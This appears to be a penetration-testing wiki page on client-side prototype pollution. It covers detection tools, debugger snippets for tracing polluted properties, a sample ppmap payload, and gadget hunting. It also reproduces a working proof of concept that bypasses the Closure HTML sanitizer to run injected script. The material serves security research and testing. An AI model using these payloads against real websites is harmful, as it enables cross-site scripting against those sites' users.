---
layout: page
title: Client Side Prototype Pollution
category: nodejs
toc:
  sidebar: left
---

## Discovering using Automatic tools

The tools [**https://github.com/dwisiswant0/ppfuzz**](https://github.com/dwisiswant0/ppfuzz?tag=v1.0.0)**,** [**https://github.com/kleiton0x00/ppmap**](https://github.com/kleiton0x00/ppmap) **and** [**https://github.com/kosmosec/proto-find**](https://github.com/kosmosec/proto-find) can be used to **find prototype pollution vulnerabilities**.

Moreover, you could also use the **browser extension** [**PPScan**](https://github.com/msrkp/PPScan) to **automatically** **scan** the **pages** you **access** for prototype pollution vulnerabilities.

<br>

### Debugging where a property is used <a href="#id-5530" id="id-5530"></a>

```javascript
// Stop debugger where 'potentialGadget' property is accessed
Object.defineProperty(Object.prototype, "potentialGadget", {
  __proto__: null,
  get() {
    console.trace();
    return "test";
  },
});
```

<br>

### Finding the root cause of Prototype Pollution <a href="#id-5530" id="id-5530"></a>

Once a prototype pollution vulnerability has been identified by any of the tools, and if the code is not overly complex, you might find the vulnerability by searching for keywords such as `location.hash`, `decodeURIComponent`, or `location.search` in the Chrome Developer Tools. This approach allows you to pinpoint the vulnerable section of the JavaScript code.

For larger and more complex codebases, a straightforward method to discover the vulnerable code involves the following steps:

1. Use a tool to identify a vulnerability and obtain a payload designed to set a property in the constructor. An example provided by ppmap might look like: `constructor[prototype][ppmap]=reserved`.
2. Set a breakpoint at the first line of JavaScript code that will execute on the page. Refresh the page with the payload, pausing the execution at this breakpoint.
3. While the JavaScript execution is paused, execute the following script in the JS console. This script will signal when the 'ppmap' property is created, aiding in locating its origin:

```javascript
function debugAccess(obj, prop, debugGet = true) {
  var origValue = obj[prop];

  Object.defineProperty(obj, prop, {
    get: function () {
      if (debugGet) debugger;
      return origValue;
    },
    set: function (val) {
      debugger;
      origValue = val;
    },
  });
}

debugAccess(Object.prototype, "ppmap");
```

4. Navigate back to the **Sources** tab and select “Resume script execution”. The JavaScript will continue executing, and the 'ppmap' property will be polluted as expected. Utilizing the provided snippet facilitates the identification of the exact location where the 'ppmap' property is polluted. By examining the **Call Stack**, different stacks where the pollution occurred can be observed.

When deciding which stack to investigate, it is often useful to target stacks associated with JavaScript library files, as prototype pollution frequently occurs within these libraries. Identify the relevant stack by examining its attachment to library files (visible on the right side, similar to an image provided for guidance). In scenarios with multiple stacks, such as those on lines 4 and 6, the logical choice is the stack on line 4, as it represents the initial occurrence of pollution and thereby the root cause of the vulnerability. Clicking on the stack will direct you to the vulnerable code.

## Finding Script Gadgets

The gadget is the **code that will be abused once a PP vulnerability is discovered**.

If the application is simple, we can **search** for **keywords** like **`srcdoc/innerHTML/iframe/createElement`** and review the source code and check if it l**eads to javascript execution**. Sometimes, mentioned techniques might not find gadgets at all. In that case, pure source code review reveals some nice gadgets like the below example.

<br>

### Example Finding PP gadget in Mithil library code

Check this writeup: [https://blog.huli.tw/2022/05/02/en/intigriti-revenge-challenge-author-writeup/](https://blog.huli.tw/2022/05/02/en/intigriti-revenge-challenge-author-writeup/)

## Recompilation of payloads for vulnerable libraries

- [https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#prototype-pollution](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#prototype-pollution)
- [https://github.com/BlackFan/client-side-prototype-pollution](https://github.com/BlackFan/client-side-prototype-pollution)

## HTML Sanitizers bypass via PP

[**This research**](https://research.securitum.com/prototype-pollution-and-bypassing-client-side-html-sanitizers/) shows PP gadgets to use to **bypass the sanizations** provided by some HTML sanitizers libraries:

- **sanitize-html**

<figure><img src="../../../images/image (1140).png" alt="https://research.securitum.com/wp-content/uploads/sites/2/2020/08/image-7.png"><figcaption></figcaption></figure>

- **dompurify**

<figure><img src="../../../images/image (1141).png" alt="https://research.securitum.com/wp-content/uploads/sites/2/2020/08/image-9.png"><figcaption></figcaption></figure>

- **Closure**

```html
<!-- from https://research.securitum.com/prototype-pollution-and-bypassing-client-side-html-sanitizers/ -->
<script>
  Object.prototype['* ONERROR'] = 1;
  Object.prototype['* SRC'] = 1;
</script>
<script src=https://google.github.io/closure-library/source/closure/goog/base.js></script>
<script>
  goog.require('goog.html.sanitizer.HtmlSanitizer');
  goog.require('goog.dom');
</script>
<body>
<script>
  const html = '<img src onerror=alert(1)>';
  const sanitizer = new goog.html.sanitizer.HtmlSanitizer();
  const sanitized = sanitizer.sanitize(html);
  const node = goog.dom.safeHtmlToNode(sanitized);

  document.body.append(node);
</script>
```

## References

- [https://infosecwriteups.com/hunting-for-prototype-pollution-and-its-vulnerable-code-on-js-libraries-5bab2d6dc746](https://infosecwriteups.com/hunting-for-prototype-pollution-and-its-vulnerable-code-on-js-libraries-5bab2d6dc746)
- [https://blog.s1r1us.ninja/research/PP](https://blog.s1r1us.ninja/research/PP)
- [https://research.securitum.com/prototype-pollution-and-bypassing-client-side-html-sanitizers/#:\~:text=my%20challenge.-,Closure,-Closure%20Sanitizer%20has](https://research.securitum.com/prototype-pollution-and-bypassing-client-side-html-sanitizers/)
